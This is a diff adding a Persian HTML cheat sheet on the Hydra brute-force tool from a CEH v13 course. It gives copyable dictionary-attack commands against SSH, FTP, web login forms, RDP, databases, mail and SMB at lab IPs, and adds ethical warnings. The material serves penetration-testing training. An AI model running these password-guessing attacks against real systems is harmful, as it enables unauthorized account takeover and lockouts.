@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>چیت‌شیت Hydra - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .copy-btn {
+            background: #4a5a7a;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+            font-weight: 600;
+        }
+        .copy-btn:hover {
+            background: #2a7de1;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            font-size: 0.95rem;
+            min-width: 550px;
+        }
+        th {
+            background: #1e3a5f;
+            color: white;
+            padding: 12px 15px;
+            text-align: right;
+            white-space: nowrap;
+            font-weight: 600;
+        }
+        td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #e8edf4;
+            vertical-align: top;
+        }
+        tr:hover {
+            background: #f1f6fa;
+        }
+        td code, th code {
+            background: #eef3f7;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: #c7254e;
+            border: 1px solid #dce3ea;
+            white-space: nowrap;
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .proto-section {
+            margin: 25px 0 15px 0;
+            border-right: 4px solid #2a7de1;
+            padding-right: 15px;
+        }
+        .proto-section h3 {
+            color: #0b3b5c;
+            border-bottom: 2px solid #b6d4f0;
+            padding-bottom: 5px;
+            margin-top: 0;
+        }
+        @media (max-width: 768px) {
+            table {
+                font-size: 0.85rem;
+                min-width: 400px;
+            }
+            th, td {
+                padding: 8px 10px;
+            }
+        }
+        @media (max-width: 480px) {
+            table {
+                font-size: 0.8rem;
+                min-width: 320px;
+            }
+            th, td {
+                padding: 6px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../index.html">خانه</a> |
+            <a href="../index.html">ابزارها</a>
+        </span>
+    </div>
+
+    <h1>🔑 چیت‌شیت جامع Hydra</h1>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔰 مقدمه – Hydra چیست؟</h2>
+        <p>
+            <b>Hydra</b> یکی از محبوب‌ترین و قدرتمندترین ابزارهای <b>Brute-Force</b> و <b>حملات دیکشنری</b> است که توسط <b>van Hauser</b> توسعه یافته و در Kali Linux به صورت پیش‌فرض نصب می‌باشد. این ابزار به متخصصان امنیت امکان می‌دهد تا با استفاده از لیست‌های دیکشنری، رمز عبور سرویس‌های مختلف را آزمایش کنند.
+        </p>
+        <p>
+            Hydra از <b>بیش از ۵۰ پروتکل</b> مختلف پشتیبانی می‌کند و می‌تواند حملات موازی با تعداد تردهای بالا انجام دهد که آن را به ابزاری بسیار سریع و کارآمد تبدیل کرده است.
+        </p>
+        <div class="info-box">
+            <b>💡 پروتکل‌های پشتیبانی‌شده توسط Hydra:</b>
+            <ul>
+                <li><b>خدمات شبکه:</b> SSH, FTP, Telnet, RDP, VNC, POP3, IMAP, SMTP</li>
+                <li><b>پروتکل‌های وب:</b> HTTP-GET, HTTP-POST, HTTPS-GET, HTTPS-POST</li>
+                <li><b>پایگاه‌های داده:</b> MySQL, PostgreSQL, Oracle, MSSQL</li>
+                <li><b>سایر:</b> SMB, SNMP, LDAP, Cisco, Teamspeak, Asterisk و …</li>
+            </ul>
+        </div>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> استفاده از Hydra برای حملات Brute-Force به سیستم‌هایی که مجوز ندارید، <b>جرم</b> محسوب می‌شود. این ابزار فقط برای تست نفوذ قانونی و در محیط‌های مجاز استفاده شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: نصب و راه‌اندازی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📥 نصب و راه‌اندازی Hydra</h2>
+
+        <h3>📌 نصب در Kali Linux (پیش‌فرض):</h3>
+        <p>Hydra در Kali Linux به صورت پیش‌فرض نصب است. برای اطمینان از آخرین نسخه:</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sudo apt update
+sudo apt install hydra -y</code></pre>
+        </div>
+
+        <h3>📌 نصب نسخه GUI (xHydra):</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sudo apt install hydra-gtk -y</code></pre>
+        </div>
+
+        <h3>📌 نصب در ویندوز:</h3>
+        <p>دانلود از: <a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">https://github.com/vanhauser-thc/thc-hydra</a></p>
+
+        <h3>📌 بررسی نصب و نسخه:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>hydra -h
+hydra -V</code></pre>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: دستورات پایه و گزینه‌ها -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>⚙️ دستورات پایه و گزینه‌های Hydra</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>گزینه</th><th>توضیح</th><th>مثال</th></tr>
+                <tr>
+                    <td><code dir='ltr'>-l</code></td>
+                    <td>نام کاربری مشخص</td>
+                    <td><code dir='ltr'>-l admin</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-L</code></td>
+                    <td>فایل حاوی لیست نام‌کاربری</td>
+                    <td><code dir='ltr'>-L users.txt</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-p</code></td>
+                    <td>رمز عبور مشخص</td>
+                    <td><code dir='ltr'>-p password123</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-P</code></td>
+                    <td>فایل حاوی لیست رمزهای عبور (دیکشنری)</td>
+                    <td><code dir='ltr'>-P passwords.txt</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-C</code></td>
+                    <td>فایل حاوی ترکیب user:password (هر خط یک ترکیب)</td>
+                    <td><code dir='ltr'>-C credentials.txt</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-t</code></td>
+                    <td>تعداد تردهای موازی (پیش‌فرض: ۱۶)</td>
+                    <td><code dir='ltr'>-t 4</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-T</code></td>
+                    <td>تعداد تردها برای هر هدف</td>
+                    <td><code dir='ltr'>-T 8</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-f</code></td>
+                    <td>پس از پیدا کردن اولین رمز موفق، متوقف شود</td>
+                    <td><code dir='ltr'>-f</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-v</code></td>
+                    <td>حالت نمایش جزئیات (Verbose)</td>
+                    <td><code dir='ltr'>-v</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-V</code></td>
+                    <td>نمایش هر تلاش (بسیار جزئی)</td>
+                    <td><code dir='ltr'>-V</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-o</code></td>
+                    <td>ذخیره خروجی در فایل</td>
+                    <td><code dir='ltr'>-o results.txt</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-s</code></td>
+                    <td>پورت سفارشی (غیر از پیش‌فرض)</td>
+                    <td><code dir='ltr'>-s 2222</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-e</code></td>
+                    <td>تست ترکیب‌های اضافی: <code dir='ltr'>n</code> (خالی), <code dir='ltr'>s</code> (همان username), <code dir='ltr'>r</code> (reverse)</td>
+                    <td><code dir='ltr'>-e nsr</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-w</code></td>
+                    <td>زمان انتظار برای پاسخ (ثانیه)</td>
+                    <td><code dir='ltr'>-w 3</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-4</code> / <code dir='ltr'>-6</code></td>
+                    <td>استفاده از IPv4 یا IPv6</td>
+                    <td><code dir='ltr'>-4</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-M</code></td>
+                    <td>فایل حاوی لیست اهداف (برای حملات به چندین هدف)</td>
+                    <td><code dir='ltr'>-M targets.txt</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-R</code></td>
+                    <td>ادامه حمله از نقطه قبلی (Resume)</td>
+                    <td><code dir='ltr'>-R</code></td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> ترکیب گزینه‌های <code dir='ltr'>-l</code> و <code dir='ltr'>-P</code> برای حملات دیکشنری با یک کاربر مشخص، و <code dir='ltr'>-L</code> و <code dir='ltr'>-P</code> برای حملات با لیست کاربران و رمزها استفاده می‌شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: حملات به پروتکل‌های مختلف -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🎯 حملات به پروتکل‌های مختلف</h2>
+
+        <!-- SSH -->
+        <div class="proto-section">
+            <h3>🔵 SSH (پورت ۲۲)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به SSH با یک کاربر مشخص
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
+
+# حمله با لیست کاربران و رمزها
+hydra -L users.txt -P passwords.txt ssh://192.168.1.101
+
+# با پورت سفارشی
+hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.101
+
+# با ۴ ترد و توقف پس از پیدا شدن
+hydra -l root -P passwords.txt -t 4 -f ssh://192.168.1.101
+
+# ذخیره خروجی
+hydra -l root -P passwords.txt ssh://192.168.1.101 -o hydra_results.txt</code></pre>
+            </div>
+        </div>
+
+        <!-- FTP -->
+        <div class="proto-section">
+            <h3>🔴 FTP (پورت ۲۱)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به FTP
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.101
+
+# با لیست کاربران
+hydra -L users.txt -P passwords.txt ftp://192.168.1.101
+
+# تست پسورد خالی
+hydra -l admin -e n ftp://192.168.1.101</code></pre>
+            </div>
+        </div>
+
+        <!-- HTTP (وب) -->
+        <div class="proto-section">
+            <h3>🟢 HTTP (وب - فرم‌های ورود)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله به فرم ورود با متد POST
+hydra -l admin -P passwords.txt 192.168.1.101 http-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"
+
+# با متد GET
+hydra -l admin -P passwords.txt 192.168.1.101 http-get-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
+
+# HTTPS
+hydra -l admin -P passwords.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:Login Failed"</code></pre>
+            </div>
+            <div class="info-box">
+                <b>💡 توضیح ساختار http-post-form:</b>
+                <br>
+                <code dir='ltr'>"/path:parameters:error_message"</code>
+                <ul>
+                    <li><b>path:</b> مسیر صفحه ورود (مثل <code dir='ltr'>/login.php</code>)</li>
+                    <li><b>parameters:</b> پارامترهای فرم با <code dir='ltr'>^USER^</code> و <code dir='ltr'>^PASS^</code> به عنوان جای‌گذار</li>
+                    <li><b>error_message:</b> پیام خطا که نشان‌دهنده ناموفق بودن ورود است</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- RDP -->
+        <div class="proto-section">
+            <h3>🟡 RDP (پورت ۳۳۸۹)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به RDP (ویندوز)
+hydra -l Administrator -P passwords.txt rdp://192.168.1.101
+
+# با پورت سفارشی
+hydra -l Administrator -P passwords.txt -s 3389 rdp://192.168.1.101</code></pre>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ هشدار:</b> حملات RDP می‌توانند باعث قفل شدن حساب‌های کاربری شوند. با احتیاط استفاده کنید.
+            </div>
+        </div>
+
+        <!-- Telnet -->
+        <div class="proto-section">
+            <h3>🟣 Telnet (پورت ۲۳)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به Telnet
+hydra -l root -P passwords.txt telnet://192.168.1.101</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> Telnet یک پروتکل ناامن است و معمولاً در سیستم‌های قدیمی یافت می‌شود.
+            </div>
+        </div>
+
+        <!-- MySQL -->
+        <div class="proto-section">
+            <h3>🗄️ MySQL (پورت ۳۳۰۶)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به MySQL
+hydra -l root -P passwords.txt mysql://192.168.1.101
+
+# با پورت سفارشی
+hydra -l root -P passwords.txt -s 3306 mysql://192.168.1.101</code></pre>
+            </div>
+        </div>
+
+        <!-- SMTP -->
+        <div class="proto-section">
+            <h3>📧 SMTP (پورت ۲۵)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله به SMTP (برای شناسایی کاربران)
+hydra -L users.txt -p test smtp://192.168.1.101 -V
+
+# حمله دیکشنری به SMTP
+hydra -l user@domain.com -P passwords.txt smtp://192.168.1.101</code></pre>
+            </div>
+        </div>
+
+        <!-- SNMP -->
+        <div class="proto-section">
+            <h3>📡 SNMP (پورت ۱۶۱)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به SNMP (Community String)
+hydra -P community.txt snmp://192.168.1.101 -v</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> SNMP معمولاً با رشته‌های community پیش‌فرض مانند <code dir='ltr'>public</code> و <code dir='ltr'>private</code> پیکربندی می‌شود.
+            </div>
+        </div>
+
+        <!-- SMB -->
+        <div class="proto-section">
+            <h3>📂 SMB (پورت ۴۴۵)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># حمله دیکشنری به SMB
+hydra -l Administrator -P passwords.txt smb://192.168.1.101</code></pre>
+            </div>
+        </div>
+
+        <!-- POP3 / IMAP -->
+        <div class="proto-section">
+            <h3>📧 POP3 (پورت ۱۱۰) و IMAP (پورت ۱۴۳)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># POP3
+hydra -l user@domain.com -P passwords.txt pop3://192.168.1.101
+
+# IMAP
+hydra -l user@domain.com -P passwords.txt imap://192.168.1.101</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: دیکشنری‌های مفید -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📚 دیکشنری‌های مفید برای Hydra</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>دیکشنری</th><th>مسیر در Kali Linux</th><th>توضیح</th></tr>
+                <tr>
+                    <td><b>rockyou.txt</b></td>
+                    <td><code dir='ltr'>/usr/share/wordlists/rockyou.txt</code></td>
+                    <td>معروف‌ترین دیکشنری، شامل میلیون‌ها رمز واقعی (نیاز به extract)</td>
+                </tr>
+                <tr>
+                    <td><b>SecLists</b></td>
+                    <td><code dir='ltr'>/usr/share/seclists/</code></td>
+                    <td>مجموعه کامل دیکشنری‌ها (نام‌کاربری، رمز، مسیرها و …)</td>
+                </tr>
+                <tr>
+                    <td><b>fasttrack.txt</b></td>
+                    <td><code dir='ltr'>/usr/share/wordlists/fasttrack.txt</code></td>
+                    <td>دیکشنری سریع برای رمزهای ضعیف</td>
+                </tr>
+                <tr>
+                    <td><b>cirt-default-passwords.txt</b></td>
+                    <td><code dir='ltr'>/usr/share/wordlists/cirt-default-passwords.txt</code></td>
+                    <td>رمزهای پیش‌فرض دستگاه‌ها</td>
+                </tr>
+                <tr>
+                    <td><b>CommonUsernamePasswords</b></td>
+                    <td><code dir='ltr'>/usr/share/seclists/Passwords/CommonCredentials/</code></td>
+                    <td>ترکیب نام‌کاربری و رمزهای رایج</td>
+                </tr>
+                <tr>
+                    <td><b>fuzz.txt</b></td>
+                    <td><code dir='ltr'>/usr/share/seclists/Fuzzing/</code></td>
+                    <td>لیست داده‌های Fuzzing</td>
+                </tr>
+            </table>
+        </div>
+
+        <h3>📌 استخراج rockyou.txt:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></pre>
+        </div>
+
+        <h3>📌 ایجاد دیکشنری سفارشی با crunch:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># ایجاد دیکشنری با طول ۸ کاراکتر شامل حروف کوچک و اعداد
+crunch 8 8 -t aaaaaaaa -o custom.txt
+
+# ترکیب دو دیکشنری
+cat dict1.txt dict2.txt > combined.txt</code></pre>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: سناریوهای عملی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🧪 سناریوهای عملی با Hydra</h2>
+
+        <h3>📌 سناریو ۱: حمله به SSH یک سرور</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># با یک کاربر و دیکشنری rockyou
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
+
+# با لیست کاربران و رمزها
+hydra -L users.txt -P passwords.txt -t 4 -f ssh://192.168.1.101</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۲: حمله به فرم ورود یک وب‌سایت</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># فرم با متد POST
+hydra -l admin -P passwords.txt 192.168.1.101 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid credentials"
+
+# فرم با متد GET و HTTPS
+hydra -L users.txt -P passwords.txt https-get-form "/login.php:user=^USER^&pass=^PASS^:Error"</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۳: حمله به چندین هدف همزمان</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># ایجاد فایل targets.txt با لیست IPها
+echo "192.168.1.101" > targets.txt
+echo "192.168.1.102" >> targets.txt
+echo "192.168.1.103" >> targets.txt
+
+# حمله به همه اهداف
+hydra -l admin -P passwords.txt -M targets.txt ssh</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۴: ادامه حمله از نقطه قبلی (Resume)</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># حمله را متوقف کنید (Ctrl+C)
+# سپس با گزینه -R ادامه دهید
+hydra -R</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۵: تست رمزهای پیش‌فرض دستگاه‌ها</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># تست با دیکشنری رمزهای پیش‌فرض
+hydra -L cirt-default-usernames.txt -P cirt-default-passwords.txt ssh://192.168.1.101</code></pre>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> برای افزایش سرعت حملات، از گزینه <code dir='ltr'>-t</code> برای تنظیم تردها و <code dir='ltr'>-T</code> برای موازی‌سازی استفاده کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: نکات امنیتی و حرفه‌ای -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔒 نکات امنیتی و حرفه‌ای</h2>
+
+        <ul>
+            <li><b>همیشه از دیکشنری‌های به‌روز استفاده کنید:</b> دیکشنری‌های قدیمی ممکن است رمزهای جدید را پوشش ندهند.</li>
+            <li><b>تنظیم تردها بر اساس سرعت شبکه:</b> تردهای زیاد ممکن است باعث شناسایی یا قطع اتصال شود.</li>
+            <li><b>استفاده از گزینه -f:</b> برای صرفه‌جویی در زمان، پس از پیدا شدن رمز، حمله را متوقف کنید.</li>
+            <li><b>ذخیره خروجی:</b> همیشه نتایج را در یک فایل ذخیره کنید تا بعداً تحلیل کنید.</li>
+            <li><b>آزمایش در محیط‌های مجاز:</b> هرگز Hydra را روی سیستم‌های بدون مجوز اجرا نکنید.</li>
+            <li><b>استفاده از دیکشنری‌های اختصاصی:</b> برای حملات هدفمند، دیکشنری‌های سفارشی با استفاده از Crunch یا CeWL بسازید.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> حملات Brute-Force می‌توانند باعث قفل شدن حساب‌های کاربری و اختلال در عملکرد سیستم شوند. همیشه با احتیاط و در زمان‌های مناسب استفاده کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📖 واژه‌نامه تخصصی Hydra</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th style="min-width:130px;">واژه</th><th>توضیح کامل</th></tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Brute-Force</span></td>
+                    <td>حمله‌ای که در آن مهاجم با امتحان کردن تمام ترکیب‌های ممکن، سعی در پیدا کردن رمز عبور دارد.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Dictionary Attack</span></td>
+                    <td>حمله‌ای که در آن از یک لیست از پیش تعیین‌شده (دیکشنری) از کلمات و عبارات برای حدس رمز استفاده می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Thread</span></td>
+                    <td>یک واحد اجرایی موازی که به Hydra اجازه می‌دهد چندین تلاش را همزمان انجام دهد.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Payload</span></td>
+                    <td>داده‌ای که در حملات Intruder به نقاط مشخص شده تزریق می‌شود (مثل رمز عبور).</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Credential</span></td>
+                    <td>مجموعه اطلاعات احراز هویت شامل نام کاربری و رمز عبور.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Protocol</span></td>
+                    <td>مجموعه قوانین برای ارتباط بین دستگاه‌ها در شبکه (مثل SSH, FTP, HTTP).</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Rate Limiting</span></td>
+                    <td>مکانیزمی که تعداد تلاش‌های ناموفق ورود را محدود می‌کند و از حملات Brute-Force جلوگیری می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Account Lockout</span></td>
+                    <td>قفل شدن حساب کاربری پس از تعداد مشخصی تلاش ناموفق برای ورود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Wordlist</span></td>
+                    <td>لیستی از کلمات که در حملات دیکشنری استفاده می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Hydra</span></td>
+                    <td>ابزاری برای اجرای حملات Brute-Force و دیکشنری روی پروتکل‌های مختلف شبکه.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">xHydra</span></td>
+                    <td>نسخه گرافیکی Hydra که استفاده از آن را برای مبتدیان آسان‌تر می‌کند.</td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی چیت‌شیت Hydra:</b>
+        <p>
+            Hydra یکی از سریع‌ترین و قدرتمندترین ابزارهای Brute-Force است که با پشتیبانی از بیش از ۵۰ پروتکل، 
+            به متخصصان امنیت امکان تست مقاومت رمزهای عبور را می‌دهد. با ترکیب دیکشنری‌های مناسب و گزینه‌های 
+            بهینه، می‌توان حملات مؤثری را در محیط‌های آزمایشگاهی پیاده‌سازی کرد.
+        </p>
+        <p>
+            <b>📌 توصیه نهایی:</b> همیشه قبل از استفاده از Hydra، مجوز کتبی دریافت کنید و در محیط‌های کنترل‌شده 
+            تمرین کنید. استفاده از دیکشنری‌های به‌روز و تنظیم تردها بر اساس شرایط شبکه، کلید موفقیت است.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">چیت‌شیت Hydra | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
